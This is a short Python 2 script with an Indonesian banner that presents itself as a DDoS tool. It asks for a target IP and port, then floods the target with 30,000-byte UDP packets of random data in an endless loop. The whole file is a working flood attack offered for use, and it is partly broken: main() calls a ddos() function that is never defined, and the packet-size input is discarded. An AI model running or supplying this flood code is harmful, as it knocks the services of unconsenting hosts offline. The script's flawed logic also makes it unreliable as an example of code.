import time

import datetime

import socket

import random

import sys


def main():

    print len(sys.argv)

    if len(sys.argv) != 4:

        use()

    else:

        ddos(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))


def use():

    print "\033[91m---------------------------------"

    print "\033[91m|  \033[92mSELAMAT DATANG DI SC DDOS    \033[91m|"
    
    print "\033[91m|\033[92mDDOS (Denial of service attack)\033[91m|"
    
    print "\033[91m|      \033[92mCap Mak Tlumpik          \033[91m|"
    
    print "\033[91m---------------------------------"
    
    ip = raw_input ("Masukkan ip target:")
    
    port = input ("Masukkan port: ")
    
    bytes = input ("Masukkan paket/bytes: ")


    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    bytes = random._urandom(30000)

    sent = 0
    
    while True:

        sock.sendto(bytes, (ip, port))

        port = port + 0

        print "\033[94mMenyerang \033[91m%s \033[94mdengan port \033[91m%s"%(ip, port)


if __name__ == '__main__':

    main()



    
